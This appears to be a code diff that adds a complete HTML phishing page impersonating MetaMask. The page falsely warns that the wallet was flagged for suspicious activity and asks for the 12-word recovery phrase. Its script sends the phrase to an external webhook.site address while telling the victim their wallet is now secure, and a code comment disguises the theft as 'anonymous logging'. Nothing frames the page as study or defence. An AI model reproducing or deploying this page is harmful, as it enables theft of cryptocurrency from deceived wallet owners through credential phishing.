@@ -1,0 +1,127 @@
+html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <title>MetaMask - Secure Your Wallet</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            width: 400px;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.1);
+            padding: 30px;
+            text-align: center;
+        }
+        .logo {
+            margin-bottom: 20px;
+            color: #5a6b8c;
+        }
+        h2 {
+            color: #3a4f6b;
+            font-size: 1.5em;
+            margin-bottom: 10px;
+        }
+        .alert {
+            background-color: #ffebee;
+            border: 1px solid #ffcdd2;
+            padding: 10px;
+            border-radius: 6px;
+            color: #c62828;
+            margin-bottom: 20px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: #3a4f6b;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 8px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+        button {
+            background-color: #3a4f6b;
+            color: white;
+            padding: 12px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 16px;
+            margin-top: 10px;
+        }
+        button:hover {
+            background-color: #2c3e50;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #888;
+        }
+        .loading {
+            display: none;
+            margin-top: 15px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">MetaMask</div>
+        <h2>Wallet Recovery Required</h2>
+        <div class="alert">
+            Your wallet has been flagged for suspicious activity. Please enter your recovery phrase to verify ownership.
+        </div>
+        <form id="recoveryForm">
+            <label for="seedPhrase">12-word Recovery Phrase:</label>
+            <input type="text" id="seedPhrase" placeholder="Enter your 12-word seed phrase..." required />
+            <button type="submit">Verify & Secure</button>
+            <div class="loading" id="loading">Verifying... Please wait.</div>
+        </form>
+        <div class="footer">
+            © MetaMask Inc. | Privacy Policy
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('recoveryForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const seedPhrase = document.getElementById('seedPhrase').value;
+
+            // Show loading animation
+            document.getElementById('loading').style.display = 'block';
+            document.querySelector('button').disabled = true;
+
+            // Send to webhook (anonymous logging)
+            fetch('https://webhook.site/178d137e-4065-41d6-a47e-16ad363b8127', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ seedPhrase })
+            }).then(() => {
+                alert("Your wallet is now secure!");
+                document.getElementById('loading').style.display = 'none';
+                document.querySelector('button').disabled = false;
+            });
+        });
+    </script>
+</body>
+</html>
